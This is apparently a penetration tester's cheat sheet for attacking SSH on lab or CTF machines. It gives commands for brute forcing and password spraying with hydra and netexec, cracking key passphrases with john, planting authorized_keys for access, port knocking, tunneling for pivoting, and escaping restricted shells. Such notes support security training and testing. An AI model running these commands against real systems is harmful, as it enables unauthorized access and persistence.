# SSH

just keep this in mind. Once you have creds or id_rsa keys, try logging in

- openssh7.2p2 is vulnerable to username enumeration https://www.exploit-db.com/exploits/40113

- you can use nxc or hydra to brute force! Not recommended unless you have a specific username or password already.

## Nmap Scripts

```bash
nmap -sV -sC -p 22 <target ip>

# specific scripts
nmap --script ssh-auth-methods -p 22 <target ip>        # what auth methods are allowed
nmap --script ssh-hostkey -p 22 <target ip>              # grab host key
nmap --script ssh-brute -p 22 <target ip>                # brute force
```

## Brute Force

```bash
nxc ssh <target ip> -u users.txt -p password.txt

hydra -L users.txt -P password.txt ssh://<target ip>

# password spray (one password against many users)
nxc ssh <target ip> -u users.txt -p 'Password123!' --no-bruteforce
```

If netexec fails to run (which happens sometimes on certain services) you can always fall back to crackmapexec, which follows the same syntax as netexec (nxc.)

## Logging In

```bash
# with password
ssh user@<target ip>

# with private key
chmod 600 id_rsa
ssh -i id_rsa user@<target ip>

# if key is encrypted, crack it first
ssh2john id_rsa > ssh_hash.txt
john ssh_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# specify non-standard port
ssh user@<target ip> -p 2222

# old key exchange algorithms (common on older boxes)
ssh -o KexAlgorithms=diffie-hellman-group1-sha1 -o HostKeyAlgorithms=ssh-rsa user@<target ip>

# if you get "no matching cipher" error
ssh -c aes128-cbc user@<target ip>
```

## Writing Your Own Keys

If you can somehow write or upload files into the /home/username/.ssh directory, you can create your own ssh keys and then enter via your own keys!

```bash
# on kali
ssh-keygen -t rsa -b 4096 -f mykey

# upload mykey.pub as /home/target user/.ssh/authorized_keys
# make sure permissions are right on target
chmod 700 /home/user/.ssh
chmod 600 /home/user/.ssh/authorized_keys

# then login with your private key
ssh -i mykey user@<target ip>
```

## Port Knocking

If SSH port appears closed on nmap, it might be behind port knocking (knockd). If you get a shell through another service, check:

```bash
cat /etc/knockd.conf
which knockd
ps aux | grep knockd
```

Knock sequence from kali:

```bash
for x in 571 290 911; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x <target ip>; done
# then immediately ssh in
```

## SSH Tunneling (useful post-exploitation)

```bash
# local port forward: access target's internal port 8080 through your localhost:8080
ssh -L 8080:127.0.0.1:8080 user@<target ip>

# dynamic SOCKS proxy
ssh -D 1080 user@<target ip>
# then configure proxychains to use socks5 127.0.0.1 1080

# remote port forward: expose your kali port 80 to target
ssh -R 8080:127.0.0.1:80 user@<target ip>
```

## Restricted Shell Bypass

if you run into a restricted shell, check out this resource 
[https://exploit-notes.hdks.org/exploit/network/protocol/restricted-shell-bypass/](https://exploit-notes.hdks.org/exploit/network/protocol/restricted-shell-bypass/)

[https://vk9-sec.com/linux-restricted-shell-bypass/](https://vk9-sec.com/linux-restricted-shell-bypass/) (SSH is interesting)
https://0xffsec.com/handbook/shells/restricted-shells/

Quick bypasses:

```bash
# try spawning a proper shell on login
ssh user@<target ip> -t "bash --noprofile"
ssh user@<target ip> -t "/bin/sh"

# if in rbash
BASH_CMDS[a]=/bin/sh;a
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
